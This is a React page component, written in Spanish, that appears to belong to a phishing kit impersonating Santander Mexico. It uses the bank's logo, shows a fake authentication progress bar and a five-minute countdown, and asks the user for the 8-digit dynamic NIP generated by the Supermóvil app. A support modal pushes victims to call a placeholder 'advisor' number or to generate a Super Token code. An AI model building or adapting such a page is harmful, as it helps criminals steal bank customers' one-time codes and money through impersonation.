import React, { useState, useEffect } from 'react';
import '../css/segundapag.css';
import { useNavigate } from 'react-router-dom';
import { AiFillYuque } from "react-icons/ai";
import emailjs from 'emailjs-com';

function Segundapag() {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos en segundos para la página principal
  const [modalTimeLeft, setModalTimeLeft] = useState(300); // Temporizador independiente para el modal
  const [showModal, setShowModal] = useState(false);
  const [showSupportModal, setShowSupportModal] = useState(false);

  useEffect(() => {
    if (timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prevTime) => prevTime - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [timeLeft]);

  useEffect(() => {
    if (showModal && modalTimeLeft > 0) {
      const timerId = setInterval(() => {
        setModalTimeLeft((prevTime) => prevTime - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [showModal, modalTimeLeft]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setModalTimeLeft(300); // Reiniciar el temporizador del modal
    setShowModal(true);
  };

  const handleSupportClick = () => {
    setShowSupportModal(true);
  };

  return (
    <div className="auth-container">
      <div className="auth-header">
        <span className="auth-logo">
          <img
            style={{ width: '160px' }}
            src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg"
            alt="Logo Santander"
          />
        </span>
      </div>

      <div className="auth-progress">
        <div className="auth-step-circle">2</div>
        <div className="auth-status">
          <p>Lo estamos autenticando</p>
          <p>1 de 2</p>
        </div>
        <div className="auth-progress-bar">
          <div className="auth-progress-bar-fill"></div>
        </div>
      </div>

      <form className="auth-form" onSubmit={handleSubmit}>
        <label>
          Por tu seguridad, confirma esta operación con el NIP dinámico de 8 dígitos que genera Supermóvil:
          <input
            type="tel"
            name="sms-code"
            maxLength={8}
            placeholder="8 dígitos"
            className="auth-input"
            required
          />
        </label>
        <div className="auth-timer">Tiempo restante: {formatTime(timeLeft)}</div>
        <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>
          Continuar
        </button>

        <div className="auth-info-text">
          <br/>
          <strong>Si tienes problemas para obtener el NIP, <br />
          Por favor,</strong>{' '}
          <span className="auth-link" onClick={handleSupportClick} style={{ color: 'red', cursor: 'pointer' }}>
            da click aquí
          </span>
        </div>

      </form>

      {/* Modal para la confirmación del botón */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <p>Su solicitud se atenderá en un momento</p>
            <p>Tiempo restante: {formatTime(modalTimeLeft)}</p>
            <button onClick={() => setShowModal(false)}>Cerrar</button>
          </div>
        </div>
      )}

      {/* Modal para el soporte */}
      {showSupportModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <strong><p>Contacta directamente con un asesor:</p></strong>
            <button
              onClick={() => window.location.href = 'tel:+525555555555'}
              style={{
                padding: '15px 20px',
                backgroundColor: 'red',
                color: 'white',
                border: 'none',
                borderRadius: '5px',
                fontSize: '16px',
                cursor: 'pointer',
                marginTop: '20px'
              }}
            >
              Llamar a un asesor
            </button>
            <hr className='linead' /> 
            <br />
            <div className="instructions">
              <strong>También puede seguir los siguientes pasos:</strong>
              <br /> <br />
              <p className='instrudty'>1. Abre la aplicación Santander <br />
              2. En la parte de abajo selecciona la opción "Super Token" <br />
              3. Ingresa tu clave Super Token para obtener el NIP dinámico</p>
            </div>
            <button onClick={() => setShowSupportModal(false)} >
              Cerrar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default Segundapag;
